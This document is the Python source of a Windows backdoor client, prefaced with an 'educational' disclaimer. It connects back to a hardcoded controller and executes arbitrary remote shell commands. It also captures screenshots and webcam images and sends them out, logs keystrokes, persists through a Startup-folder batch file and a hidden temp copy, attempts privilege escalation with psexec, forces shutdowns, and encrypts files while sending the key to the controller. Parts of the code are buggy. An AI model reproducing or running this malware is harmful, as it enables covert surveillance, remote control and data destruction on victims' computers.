# legal disclamer:
#it's just for educational things
#test it just in system your have permissions to use that program
#rememenber, with powers come big responsabilitys. ass: Rossini135
#contact infos: 
#email: rossiniroberto52@gmail.com
#twitter: @rossin135

#github: https://github.com/rossiniroberto52/backdoor.git
import socket, os, subprocess, webbrowser, shutil, winreg, ctypes, time, random, io, cv2
from cryptography.fernet import Fernet
#from bitcoin import *
from PIL import ImageGrab
from datetime import datetime
from pynput.keyboard import Key as key
from pynput.keyboard import Listener
from getpass import getuser
from pathlib import Path
from os import path
from sys import argv

os.system("cls")

#conn vars
IP = "192.168.0.3"
PORT = 6667

#most used vars
USER = getuser()

#used PATHS:
temp_path = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER

keys = []

def cam_capture():
    webcam = cv2.VideoCapture(0)
    while True:
        try:
            check, frame = webcam.read()
            cv2.imshow("Capture", frame)
            cv2.imwrite(filename='saved_img.jpg', img=frame)
            webcam.release()
            img_new = cv2.imread('saved_img.jpg', cv2.IMREAD_GRAYSCALE)
            img_new = cv2.imshow("Captured Image", img_new)
            cv2.waitKey(1650)
            cv2.destroyAllWindows()
            img_ = cv2.imread('saved_im.jpg', cv2.IMREAD_ANYCOLOR)
            gray = cv2.COLOR_BGR2GRAY
            img_ = cv2.resize(gray, (28,28))
            img_resized = cv2.imwrite(filename='save_img-final.jpg', img=img_)
            size = len(img_)
            conn.send(bytes(str(size), 'utf-8'))
            conn.send(img_)
            break
        except:
            webcam.release()
            cv2.destroyAllWindows()
            conn.send("cam not found!".encode("utf-8"))
            break

def functionPK(key):
    keys.append(key)
    storeKeysToFile(keys)

def screenshot():
    #take and save screenshots
    img = ImageGrab.grab(bbox = (10,10,1930,1090))
    img_to_send = img.tobytes()
    size = len(img_to_send)
    conn.send(bytes(str(size), 'utf-8'))
    conn.send(img_to_send)

    
    
def storeKeysToFile(keys):   
    with open('keylog.txt', 'w') as log:  
        for the_key in keys:   
            the_key = str(the_key).replace("'", " ")  
            log.write(the_key)  

def kill():
    os.system("msg %username% have a nice day and good luck fixing this pc")
    os.system("shutdown -s -t 3")


def clone():
    try:
        path_to_create = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER
        if not os.path.exists(path_to_create):
            os.makedirs(path_to_create)
        fileToCopy = 'clt.exe'
        shutil.copy2(fileToCopy, path_to_create)
    except:
        msg = "error to create\copy...."
        conn.send(msg.encode("utf-8"))
        pass

def get_banner():
    s = socket.socket()
    s.connect(('google.com',80))
    s.send(b'GET/\n\n')
    conn.send(s.recv(1024))
    s.close()

def bat_create(file_path=""):
    if(file_path == ""):
        file_path = temp_path
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start /b %s\\clt.exe' % file_path)
        bat_file.close()
        msg = "[+] .bat file created!"
        conn.send(msg.encode("utf-8"))

#working process

#develop-in
def giving_root():
    while True:
        retorno = ctypes.windll.shell32.ShellExecuteW(None, u"runas", u"psexec.exe", u"-accepteula -nobanner -s -d " + temp_path + "\\clt.exe", None, 0)
        ##only debug mode
        print(retorno)
        if retorno == 42:
           break
        time.sleep(random.randint(1,11))
    exit()


conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((IP,PORT))

while True:
    cmd = conn.recv(1024).decode('utf-8')
    if cmd == "/help":
        print("help menu\n commands: \n exit: break the connection with the target\n kill: open infinity tabs with a rick roll meme and crash the pc (not forever) \n stay: make a copy of this backdoor for a paste in tmp arquives (read the docs(in progress) \n banner: get somme infos about the device \n Kstay: a mix of the function stay and kill \n keylog(in progress): registy any keys typed in the keyboard \n help: open this menu")
    if cmd == "/exit":
        break
    if cmd == "/kill":
        kill()
    if cmd == "/screenlog":
        screenshot()
    if cmd == "/troll":
        link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        while True:
            os.system("msg %username% lol")
            webbrowser.open_new(link)
    if cmd == "/stay":
        bat_create()
        clone()
        #re-start the server
    if cmd == "/banner":
        get_banner()
    if cmd == "/Kstay":
        bat_create()
        clone()
        kill()
        # Kstay shutdown the sistem. stay dont shutdown
        #re-start the server
    if cmd == "/keylog":
        with Listener(on_press = functionPK) as the_listener:  
            the_listener.join()
    if cmd == "/camshot":
        cam_capture()
    if cmd == "/root":
        giving_root()
    if cmd == "/encypt": #i dont test this wet
        key = Fernet.generate_key();
        conn.send(key)
        with open('key.key','wb') as f:
            f.write(key)
        for path, dirs, files in os.walk('./'):
            for file in files:
                if file == 'clt.py' or file == 'key.key':
                    continue
        file_path = os.path.join(path,file)
        with open(file_path,'rb') as f:
            content = f.read()  
        content_encrypt = Fernet(key).encrypt(content)
        with open(file_path,'wb') as f:
            f.write(content_encrypt)

    os.system(cmd)
    output = subprocess.getoutput(cmd)
    conn.send(output.encode('utf-8'))
    os.system("cls")
os.system("cls")
conn.close()
exit()